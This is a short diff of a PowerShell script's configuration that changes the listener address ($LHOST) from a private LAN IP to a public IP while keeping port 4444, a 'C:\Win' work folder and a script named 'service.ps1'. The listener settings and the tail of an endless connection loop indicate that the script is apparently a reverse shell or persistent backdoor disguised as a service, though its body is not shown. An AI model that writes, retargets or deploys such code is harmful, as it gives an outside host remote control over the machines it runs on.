@@ -1,5 +1,5 @@
 # --- CONFIGURATION ---
-$LHOST = "192.168.1.129" # Your listener IP
+$LHOST = "88.226.172.80" # Your listener IP
 $LPORT = 4444          # Your listener Port
 $WorkDir = "C:\Win"
 $ScriptName = "service.ps1"
@@ -102,3 +102,4 @@ while ($true) {
         if ($null -ne $writer) { $writer.Close() }
     }
 }
+
